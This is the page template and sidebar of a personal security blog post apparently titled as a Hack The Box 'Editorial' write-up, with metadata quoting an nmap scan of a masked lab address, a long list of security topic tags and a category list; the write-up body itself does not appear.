<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>【season-5】box Editorial wp | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="nmap12345678910111213└─$ sudo nmap -sS 10.129.xxx.xxx -p22,80 -sV --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-06-16 00:24 EDTNmap scan report for 10.129.xx.xx (10.129.xx.xx)Host">
<meta property="og:type" content="article">
<meta property="og:title" content="【season-5】box Editorial wp">
<meta property="og:url" content="http://example.com/2024/06/16/box-Editorial-wp/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="nmap12345678910111213└─$ sudo nmap -sS 10.129.xxx.xxx -p22,80 -sV --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-06-16 00:24 EDTNmap scan report for 10.129.xx.xx (10.129.xx.xx)Host">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/Editorial/background.jpg">
<meta property="article:published_time" content="2024-06-16T06:23:26.000Z">
<meta property="article:modified_time" content="2024-08-23T08:39:56.534Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/Editorial/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">11</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
